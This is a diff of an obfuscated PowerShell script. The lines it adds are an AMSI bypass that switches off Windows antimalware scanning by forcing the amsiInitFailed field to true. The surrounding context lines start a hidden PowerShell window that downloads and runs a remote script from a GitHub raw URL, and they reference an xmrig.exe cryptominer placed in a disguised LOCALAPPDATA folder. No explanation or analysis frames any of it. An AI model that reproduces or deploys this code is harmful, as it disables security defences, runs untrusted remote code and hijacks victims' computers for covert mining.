@@ -1,3 +1,8 @@
+${W} = ('System.'+'Man'+'ag'+'ement.A'+'u'+'toma'+'tion'+'.'+'A');${c} = 'si';${M} = ('U'+'tils')
+${as`semB`lY} = [Ref]."a`s`seMBLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W},${c},${m}))
+${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('Non'+'P'+'ublic'+',St'+'a'+'tic'))
+${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})
+
 &('S'+'tar'+'t-Process') -FilePath ("po"+"wers"+"hell") -WindowStyle ('H'+'idden') -ArgumentList "Invoke-Expression (Invoke-REstMethod -Uri `'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt`')"
 ﻿${pA`TH} = "$env:LOCALAPPDATA\CTF\xmrig.exe"
 ${ATIvopRo`cE`Ss} = ${f`A`LSe}
